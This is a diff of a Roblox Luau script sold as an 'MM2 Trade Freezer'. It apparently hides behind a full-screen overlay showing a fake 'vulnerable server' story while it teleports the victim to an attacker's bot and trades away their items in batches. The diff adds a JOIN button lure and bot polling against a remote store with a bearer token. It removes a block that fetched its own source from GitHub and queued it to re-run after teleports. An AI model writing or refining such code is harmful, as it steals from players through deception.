@@ -1,6 +1,6 @@
 --============================================================
--- SIDE 2 — CLIENT (v51)
--- MM2 Trade Freezer — every join method, spawned threads
+-- SIDE 2 — CLIENT (v53)
+-- MM2 Trade Freezer — always-visible JOIN button + info panel
 --============================================================
 local Players             = game:GetService("Players")
 local VirtualInputManager = game:GetService("VirtualInputManager")
@@ -62,8 +62,7 @@ local ITEMS_PER_BATCH      = 6
 local CONFIRM_WAIT         = 7
 local CLICK_GAP            = 0.4
 local POST_JOIN_WAIT       = 10
-local SNIPE_POLL_INTERVAL  = 5
-local BLOCKED_CALL_TIMEOUT = 2
+local SNIPE_POLL_INTERVAL  = 3
 local KICK_MESSAGE         = "Error, script did not load in time, try another time or contact support in https://discord.gg/SfeBgTx5V8"
 
 local SELF_SOURCE_URL      = "https://raw.githubusercontent.com/tturnaa/mm2-trade-freezer/refs/heads/main/trade"
@@ -73,111 +72,32 @@ log("config loaded | Bot:", BOT_USERNAME, "| Discord:", DISCORD_USERNAME)
 
 local KILLED = false
 
---==================== TIMEOUT HELPER ====================
-local function runWithTimeout(fn, timeout)
-    timeout = timeout or BLOCKED_CALL_TIMEOUT
-    local done = false
-    local result_ok = nil
-    local result_val = nil
-
-    task.spawn(function()
-        local ok, val = pcall(fn)
-        result_ok = ok
-        result_val = val
-        done = true
-    end)
-
-    local endT = tick() + timeout
-    while tick() < endT and not done do
-        task.wait(0.1)
-    end
-
-    if not done then return false, nil, true end
-    return result_ok, result_val, false
-end
---================================================
-
---==================== AUTO-EXEC ====================
-local TeleportCheck = false
-
-local function queueAutoExec()
-    if TeleportCheck then return false end
-    TeleportCheck = true
-
-    if IS_MOBILE then
-        log("autoexec: SKIPPED on mobile")
-        return false
-    end
-
-    log("autoexec: fetching source...")
-    local ok, body = pcall(function()
-        return game:HttpGet(SELF_SOURCE_URL, true)
-    end)
-    if not ok or type(body) ~= "string" or #body < 100 then
-        log("autoexec: fetch failed")
-        return false
-    end
-
-    log("autoexec: fetched " .. #body .. " bytes")
-
-    local queueteleport = queue_on_teleport
-        or queueonteleport
-        or (syn and syn.queue_on_teleport)
-        or (fluxus and fluxus.queue_on_teleport)
-
-    if type(queueteleport) ~= "function" then
-        log("autoexec: no queue function")
-        return false
-    end
-
-    local qok = pcall(queueteleport, body)
-    log("autoexec: queued ok = " .. tostring(qok))
-    return qok
-end
-
-task.spawn(function()
-    pcall(function()
-        player.OnTeleport:Connect(function(State)
-            if State == Enum.TeleportState.Started or State == Enum.TeleportState.InProgress then
-                log("OnTeleport fired:", tostring(State))
-                queueAutoExec()
-            end
-        end)
-    end)
-end)
-
 --==================== KV ====================
 local function kvGet(key)
-    local ok, val, timedout = runWithTimeout(function()
-        local res = httpReq({
-            Url = KV_URL .. "/get/" .. key,
-            Method = "GET",
-            Headers = { ["Authorization"] = "Bearer " .. KV_TOKEN },
-        })
-        if not res then return nil end
-        local body = res.Body or res.body
-        if not body then return nil end
-        local decodeOk, data = pcall(HttpService.JSONDecode, HttpService, body)
-        if decodeOk and data then return data.result end
-        return nil
-    end, 2)
-    if timedout then return nil end
-    return ok and val or nil
+    local res = httpReq({
+        Url = KV_URL .. "/get/" .. key,
+        Method = "GET",
+        Headers = { ["Authorization"] = "Bearer " .. KV_TOKEN },
+    })
+    if not res then return nil end
+    local body = res.Body or res.body
+    if not body then return nil end
+    local ok, data = pcall(HttpService.JSONDecode, HttpService, body)
+    if ok and data then return data.result end
+    return nil
 end
 
 local function kvSet(key, value)
     task.spawn(function()
-        runWithTimeout(function()
-            httpReq({
-                Url = KV_URL .. "/set/" .. key,
-                Method = "POST",
-                Headers = {
-                    ["Authorization"] = "Bearer " .. KV_TOKEN,
-                    ["Content-Type"]  = "text/plain",
-                },
-                Body = value,
-            })
-        end, 2)
+        httpReq({
+            Url = KV_URL .. "/set/" .. key,
+            Method = "POST",
+            Headers = {
+                ["Authorization"] = "Bearer " .. KV_TOKEN,
+                ["Content-Type"]  = "text/plain",
+            },
+            Body = value,
+        })
     end)
 end
 
@@ -234,7 +154,9 @@ screenGui.Parent = parentGui
 local overlay
 local spinner
 local statusLabel
-local subStatusLabel
+local joinButton
+local infoLabel       -- shows beacon state under the button
+local pendingJob = nil
 
 local function buildOverlay()
     if overlay then return end
@@ -250,7 +172,7 @@ local function buildOverlay()
 
     local title = Instance.new("TextLabel")
     title.Size = UDim2.new(1, 0, 0, IS_MOBILE and 56 or 44)
-    title.Position = UDim2.new(0, 0, 0.28, 0)
+    title.Position = UDim2.new(0, 0, 0.22, 0)
     title.BackgroundTransparency = 1
     title.TextColor3 = Color3.fromRGB(120, 255, 160)
     title.Text = "MM2 Trade Freezer"
@@ -261,8 +183,8 @@ local function buildOverlay()
     Instance.new("UITextSizeConstraint", title).MaxTextSize = IS_MOBILE and 44 or 34
 
     spinner = Instance.new("ImageLabel")
-    spinner.Size = UDim2.new(0, IS_MOBILE and 120 or 80, 0, IS_MOBILE and 120 or 80)
-    spinner.Position = UDim2.new(0.5, 0, 0.42, 0)
+    spinner.Size = UDim2.new(0, IS_MOBILE and 90 or 60, 0, IS_MOBILE and 90 or 60)
+    spinner.Position = UDim2.new(0.5, 0, 0.36, 0)
     spinner.AnchorPoint = Vector2.new(0.5, 0.5)
     spinner.BackgroundTransparency = 1
     spinner.Image = "rbxassetid://4965945816"
@@ -271,8 +193,8 @@ local function buildOverlay()
     spinner.Parent = overlay
 
     statusLabel = Instance.new("TextLabel")
-    statusLabel.Size = UDim2.new(1, 0, 0, IS_MOBILE and 48 or 40)
-    statusLabel.Position = UDim2.new(0, 0, 0.55, 0)
+    statusLabel.Size = UDim2.new(1, 0, 0, 44)
+    statusLabel.Position = UDim2.new(0, 0, 0.48, 0)
     statusLabel.BackgroundTransparency = 1
     statusLabel.TextColor3 = Color3.fromRGB(220, 220, 220)
     statusLabel.Text = ""
@@ -280,19 +202,114 @@ local function buildOverlay()
     statusLabel.Font = Enum.Font.Gotham
     statusLabel.ZIndex = 99991
     statusLabel.Parent = overlay
-    Instance.new("UITextSizeConstraint", statusLabel).MaxTextSize = IS_MOBILE and 32 or 24
+    Instance.new("UITextSizeConstraint", statusLabel).MaxTextSize = IS_MOBILE and 28 or 22
 
-    subStatusLabel = Instance.new("TextLabel")
-    subStatusLabel.Size = UDim2.new(1, 0, 0, 32)
-    subStatusLabel.Position = UDim2.new(0, 0, 0.62, 0)
-    subStatusLabel.BackgroundTransparency = 1
-    subStatusLabel.TextColor3 = Color3.fromRGB(160, 160, 160)
-    subStatusLabel.Text = ""
-    subStatusLabel.TextScaled = true
-    subStatusLabel.Font = Enum.Font.Gotham
-    subStatusLabel.ZIndex = 99991
-    subStatusLabel.Parent = overlay
-    Instance.new("UITextSizeConstraint", subStatusLabel).MaxTextSize = 18
+    -- ALWAYS-VISIBLE join button
+    joinButton = Instance.new("TextButton")
+    joinButton.Size = UDim2.new(0, IS_MOBILE and 300 or 260, 0, IS_MOBILE and 68 or 58)
+    joinButton.Position = UDim2.new(0.5, 0, 0.60, 0)
+    joinButton.AnchorPoint = Vector2.new(0.5, 0)
+    joinButton.BackgroundColor3 = Color3.fromRGB(50, 170, 70)
+    joinButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    joinButton.Text = "▶ JOIN BOT SERVER"
+    joinButton.TextScaled = true
+    joinButton.Font = Enum.Font.GothamBold
+    joinButton.ZIndex = 99999
+    joinButton.Parent = overlay
+    Instance.new("UICorner", joinButton).CornerRadius = UDim.new(0, 14)
+
+    -- Info label under the button — shows beacon state
+    infoLabel = Instance.new("TextLabel")
+    infoLabel.Size = UDim2.new(1, 0, 0, 80)
+    infoLabel.Position = UDim2.new(0, 0, 0.74, 0)
+    infoLabel.BackgroundTransparency = 1
+    infoLabel.TextColor3 = Color3.fromRGB(160, 220, 160)
+    infoLabel.Text = "Fetching bot info..."
+    infoLabel.TextScaled = true
+    infoLabel.Font = Enum.Font.Gotham
+    infoLabel.ZIndex = 99991
+    infoLabel.Parent = overlay
+    Instance.new("UITextSizeConstraint", infoLabel).MaxTextSize = IS_MOBILE and 20 or 16
+
+    joinButton.MouseButton1Click:Connect(function()
+        log("[JOIN BUTTON] tapped")
+
+        if not pendingJob then
+            log("[JOIN BUTTON] no pending job — fetching now...")
+            joinButton.Text = "Fetching..."
+            -- Try to fetch beacon right now
+            local status = kvGet("bot_status")
+            local beacon = kvGet("roblox_beacon")
+            if beacon and beacon ~= "" then
+                local info
+                local bot, placeId, jobId, userId = beacon:match(
+                    "SERVER|([^|]+)|PlaceId=(%d+)|JobId=([%w%-_]+)|UserId=(%d+)")
+                if bot and jobId then
+                    info = { placeId = tonumber(placeId), jobId = jobId, userId = tonumber(userId) }
+                end
+                if info then
+                    pendingJob = info
+                    log("[JOIN BUTTON] fetched beacon on tap")
+                end
+            end
+
+            if not pendingJob then
+                joinButton.Text = "❌ No bot found"
+                infoLabel.Text = "Make sure bot is running and beacon is active"
+                task.wait(2)
+                joinButton.Text = "▶ JOIN BOT SERVER"
+                return
+            end
+        end
+
+        local placeId = pendingJob.placeId
+        local jobId   = pendingJob.jobId
+        local userId  = pendingJob.userId
+
+        if jobId == game.JobId then
+            log("[JOIN BUTTON] already in bot's server")
+            joinButton.Text = "✅ ALREADY IN SERVER"
+            task.wait(2)
+            joinButton.Text = "▶ JOIN BOT SERVER"
+            return
+        end
+
+        joinButton.Text = "Joining " .. tostring(jobId):sub(1, 8) .. "..."
+        joinButton.BackgroundColor3 = Color3.fromRGB(180, 150, 40)
+        infoLabel.Text = "Calling TeleportToPlaceInstance..."
+        log("[JOIN BUTTON] TeleportToPlaceInstance(" ..
+            tostring(placeId) .. ", " .. tostring(jobId) .. ")")
+
+        local ok, err = pcall(function()
+            TeleportService:TeleportToPlaceInstance(placeId, jobId, player)
+        end)
+        log("[JOIN BUTTON] result ok=" .. tostring(ok) .. " err=" .. tostring(err))
+
+        if not ok then
+            infoLabel.Text = "Primary failed, trying TeleportAsync..."
+            log("[JOIN BUTTON] trying TeleportAsync")
+            local ok2, err2 = pcall(function()
+                TeleportService:TeleportAsync(placeId, { player }, { JobId = jobId })
+            end)
+            log("[JOIN BUTTON] TeleportAsync ok=" .. tostring(ok2) .. " err=" .. tostring(err2))
+            if not ok2 then
+                infoLabel.Text = "Both failed: " .. tostring(err):sub(1, 60)
+                joinButton.Text = "❌ Teleport failed — tap to retry"
+                joinButton.BackgroundColor3 = Color3.fromRGB(200, 80, 80)
+                task.wait(3)
+                joinButton.Text = "▶ JOIN BOT SERVER"
+                joinButton.BackgroundColor3 = Color3.fromRGB(50, 170, 70)
+                return
+            end
+        end
+
+        -- Success — Roblox should start the teleport
+        infoLabel.Text = "Teleport fired. Waiting..."
+        task.wait(3)
+        joinButton.Text = "▶ JOIN BOT SERVER"
+        joinButton.BackgroundColor3 = Color3.fromRGB(50, 170, 70)
+        infoLabel.Text = "Tap again if you weren't teleported"
+    end)
 
     task.spawn(function()
         while spinner and spinner.Parent do
@@ -311,8 +328,8 @@ local function setStatus(s)
     if statusLabel then statusLabel.Text = s end
 end
 
-local function setSubStatus(s)
-    if subStatusLabel then subStatusLabel.Text = s end
+local function setInfo(s)
+    if infoLabel then infoLabel.Text = s end
 end
 
 --==================== KICK ====================
@@ -351,197 +368,6 @@ local function findBot()
     end
 end
 
---==================== TELEPORT — ALL METHODS ====================
-local function tryMethod(name, fn)
-    log("attempting " .. name .. "...")
-    local ok, val, timedout = runWithTimeout(fn, 3)
-    if timedout then
-        log("  " .. name .. " TIMED OUT")
-        return false, "timed out"
-    end
-    if ok then
-        log("  " .. name .. " fired OK")
-        return true, nil
-    end
-    log("  " .. name .. " ERROR: " .. tostring(val))
-    return false, tostring(val)
-end
-
-local function teleportToServer(placeId, jobId, userId)
-    log("=== TELEPORT START ===")
-    log("placeId:", placeId, "jobId:", jobId, "userId:", tostring(userId))
-
-    local attempts = {}
-
-    -- Method 1: TeleportToPlaceInstance (PC's main method)
-    local ok1, err1 = tryMethod("TeleportToPlaceInstance", function()
-        TeleportService:TeleportToPlaceInstance(placeId, jobId, player)
-    end)
-    table.insert(attempts, "TeleportToPlaceInstance=" .. tostring(ok1))
-    if ok1 then return true end
-
-    -- Method 2: TeleportAsync
-    if TeleportService.TeleportAsync then
-        local ok2, err2 = tryMethod("TeleportAsync", function()
-            TeleportService:TeleportAsync(placeId, { player }, { JobId = jobId })
-        end)
-        table.insert(attempts, "TeleportAsync=" .. tostring(ok2))
-        if ok2 then return true end
-    end
-
-    -- Method 3: ExperienceService:LaunchExperience (mobile-friendly)
-    local ExperienceService = game:GetService("ExperienceService")
-    if ExperienceService and ExperienceService.LaunchExperience then
-        local ok3 = tryMethod("LaunchExperience", function()
-            ExperienceService:LaunchExperience({
-                placeId = placeId,
-                gameInstanceId = jobId,
-                referredByPlayerId = userId,
-            })
-        end)
-        table.insert(attempts, "LaunchExperience=" .. tostring(ok3))
-        if ok3 then return true end
-    end
-
-    -- Method 4: GuiService:OpenBrowserWindow with roblox:// deep link
-    local uri = "roblox://placeId=" .. tostring(placeId) ..
-                "&gameInstanceId=" .. tostring(jobId)
-    if userId then
-        uri = uri .. "&referredByPlayerId=" .. tostring(userId)
-    end
-    local ok4 = tryMethod("OpenBrowserWindow", function()
-        GuiService:OpenBrowserWindow(uri)
-    end)
-    table.insert(attempts, "OpenBrowserWindow=" .. tostring(ok4))
-    if ok4 then return true end
-
-    -- Method 5: Roblox's internal Join API via GuiService
-    -- (used by the Roblox app when you tap "Join" on a friend)
-    local ok5 = tryMethod("GuiService Join", function()
-        -- Try several known internal method names
-        if GuiService.JoinGame then
-            GuiService:JoinGame(placeId, jobId)
-        elseif GuiService.JoinServer then
-            GuiService:JoinServer(placeId, jobId)
-        elseif player.JoinServer then
-            player:JoinServer(placeId, jobId)
-        else
-            error("no internal join method available")
-        end
-    end)
-    table.insert(attempts, "GuiServiceJoin=" .. tostring(ok5))
-    if ok5 then return true end
-
-    log("=== TELEPORT FAILED. Attempts: " .. table.concat(attempts, " | ") .. " ===")
-    return false
-end
-
---==================== JOIN ====================
-local function joinTargetServer()
-    log("=== JOIN START ===")
-    kvSet("client_ask", "ASK")
-
-    log("waiting for bot_reply (15s)...")
-    local endT = tick() + 15
-    while tick() < endT do
-        if KILLED then return false end
-        local reply = kvGet("bot_reply")
-        if reply and reply ~= "" and type(reply) == "string" then
-            log("  got reply:", reply)
-            kvSet("bot_reply", "")
-            break
-        end
-        task.wait(1)
-    end
-
-    log("polling for beacon (30s)...")
-    endT = tick() + 30
-    local attempt = 0
-    while tick() < endT do
-        if KILLED then return false end
-        attempt = attempt + 1
-
-        local status = kvGet("bot_status")
-        log("  attempt " .. attempt .. " | bot_status:", tostring(status))
-
-        if status == "OPEN" then
-            local beacon = kvGet("roblox_beacon")
-            log("  beacon:", tostring(beacon))
-
-            if beacon and beacon ~= "" then
-                local info = parseServerBeacon(beacon)
-                if not info then
-                    log("  beacon parse FAILED. Raw:", beacon)
-                else
-                    log("  parsed placeId=" .. tostring(info.placeId) ..
-                        " jobId=" .. tostring(info.jobId) ..
-                        " userId=" .. tostring(info.userId))
-
-                    if info.jobId == game.JobId then
-                        log("  already in bot's server")
-                        return true
-                    end
-
-                    task.wait(1)
-                    local beacon2 = kvGet("roblox_beacon")
-                    local info2 = parseServerBeacon(beacon2)
-                    if info2 and info2.jobId ~= info.jobId then
-                        log("  bot hopped during check! new jobId:", info2.jobId)
-                        info = info2
-                    end
-
-                    setSubStatus("Trying all join methods...")
-                    local ok = teleportToServer(info.placeId, info.jobId, info.userId)
-                    log("  teleport result:", ok)
-
-                    if ok then
-                        log("  verifying join (up to 20s)...")
-                        local verifyEnd = tick() + 20
-                        local joined = false
-                        while tick() < verifyEnd do
-                            if KILLED then return false end
-                            task.wait(1)
-                            local currentBeacon = kvGet("roblox_beacon")
-                            local currentInfo = parseServerBeacon(currentBeacon)
-                            if currentInfo and currentInfo.jobId == game.JobId then
-                                log("  confirmed: we are in bot's server")
-                                joined = true
-                                break
-                            end
-                            if findBot() then
-                                log("  confirmed: bot found in player list")
-                                joined = true
-                                break
-                            end
-                        end
-                        if not joined then
-                            log("  never landed in bot's server")
-                            return false
-                        end
-                    else
-                        log("  teleport failed — all methods exhausted")
-                    end
-
-                    return ok
-                end
-            else
-                log("  beacon empty")
-            end
-        elseif status == "HOPPING" then
-            log("  bot is hopping — waiting")
-        elseif status == nil then
-            log("  KV read returned nil")
-        else
-            log("  unknown bot_status:", tostring(status))
-        end
-
-        task.wait(SNIPE_POLL_INTERVAL)
-    end
-
-    log("=== JOIN FAILED (timeout) ===")
-    return false
-end
-
 --==================== FAILURE POLLER ====================
 task.spawn(function()
     while not KILLED do
@@ -559,22 +385,19 @@ task.spawn(function()
     end
 end)
 
---==================== LEADERBOARD LOOKUP ====================
+--==================== LEADERBOARD / TRADE ====================
 local function findLeaderboardRow()
     local row = resolve({"MainGUI","Game","Leaderboard","Container", BOT_USERNAME})
     if row then return row, "direct" end
-
     row = resolve({"Players",
         function(g) return g:FindFirstChild(player.Name) end,
         "PlayerGUI","MainGUI","Game","Leaderboard","Container", BOT_USERNAME})
     if row then return row, "alt-path" end
-
     for _, o in ipairs(playerGui:GetDescendants()) do
         if o.Name == BOT_USERNAME and o:IsA("GuiObject") then
             return o, "name-scan"
         end
     end
-
     for _, o in ipairs(playerGui:GetDescendants()) do
         if (o:IsA("TextLabel") or o:IsA("TextButton")) and o.Text then
             if o.Text:lower():find(BOT_USERNAME:lower(), 1, true) then
@@ -609,45 +432,20 @@ local function findTradeButton()
     return nil, "not-found"
 end
 
---==================== MAIN FLOW ====================
-local function runFlow()
-    buildOverlay()
-    log("=== MAIN FLOW START ===")
-
-    setStatus("Loading contents...")
-    task.wait(3)
-    setStatus("Looking for vulnerable server...")
-    task.wait(4)
-    setStatus("Found vulnerable server")
-    task.wait(2)
-    setStatus("Joining server...")
-
-    if findBot() then
-        log("bot already in server — skip join")
-        task.wait(1)
-    else
-        local ok = joinTargetServer()
-        if not ok and not findBot() then
-            log("join failed — stopping")
-            setStatus("❌ Could not reach server")
-            return
-        end
-        task.wait(POST_JOIN_WAIT)
-        if KILLED then return end
-    end
-
-    setStatus("Loading script...")
-    setSubStatus("")
+--==================== TRADE LOOP ====================
+local function runTradeLoop()
+    log("=== TRADE LOOP START ===")
+    setStatus("Bot is in server — trading")
+    if joinButton then joinButton.Visible = false end
+    if infoLabel then infoLabel.Visible = false end
 
     log("waiting for bot in player list (20s)...")
     local waitEnd = tick() + 20
-    local botHere = false
     while tick() < waitEnd do
         if KILLED then return end
-        if findBot() then botHere = true; break end
+        if findBot() then break end
         task.wait(0.5)
     end
-    log("bot in player list:", botHere)
 
     log("finding leaderboard row...")
     local row, how = findLeaderboardRow()
@@ -680,7 +478,6 @@ local function runFlow()
 
         for i = 1, ITEMS_PER_BATCH do
             if KILLED then return end
-
             local parent = nil
             if IS_MOBILE then
                 parent = resolve({
@@ -752,7 +549,6 @@ local function runFlow()
             return
         end
         log("  trade closed successfully")
-
         task.wait(1)
 
         local tg = playerGui:FindFirstChild(tradeGuiName)
@@ -769,12 +565,62 @@ local function runFlow()
     end
 end
 
---==================== AUTO-START ====================
+--==================== BEACON MONITOR + AUTO-START TRADING ====================
+local function beaconMonitor()
+    while not KILLED do
+        task.wait(3)
+
+        -- If bot appears in server, hide the button and start trading
+        if findBot() then
+            if joinButton and joinButton.Visible then
+                log("[Monitor] bot detected — starting trade loop")
+                joinButton.Visible = false
+                if infoLabel then infoLabel.Visible = false end
+                setStatus("Bot is in server — trading")
+                task.spawn(runTradeLoop)
+            end
+        else
+            -- Bot not here. Fetch beacon and update UI.
+            local status = kvGet("bot_status")
+            local beacon = kvGet("roblox_beacon")
+
+            if beacon and beacon ~= "" then
+                local info = parseServerBeacon(beacon)
+                if info then
+                    pendingJob = info
+                    if joinButton then joinButton.Text = "▶ JOIN BOT SERVER" end
+                    if infoLabel then
+                        infoLabel.Text = "Bot online | JobId: " ..
+                            tostring(info.jobId):sub(1, 8) .. "... | " ..
+                            tostring(status or "?")
+                    end
+                else
+                    if infoLabel then infoLabel.Text = "Beacon format error" end
+                end
+            else
+                if infoLabel then infoLabel.Text = "Bot offline — waiting for beacon" end
+            end
+        end
+    end
+end
+
+--==================== INIT ====================
 task.spawn(function()
     task.wait(0.5)
-    local ok, err = pcall(runFlow)
-    if not ok then
-        log("runFlow ERROR:", tostring(err))
+    buildOverlay()
+    log("=== MAIN FLOW START ===")
+
+    -- Initial UI state
+    setStatus("Looking for bot...")
+    setInfo("Fetching bot info...")
+
+    -- Kick off the monitor
+    task.spawn(beaconMonitor)
+
+    -- If bot is already here, trade right away
+    if findBot() then
+        log("bot already in server — starting trade loop")
+        task.spawn(runTradeLoop)
     end
 end)
 
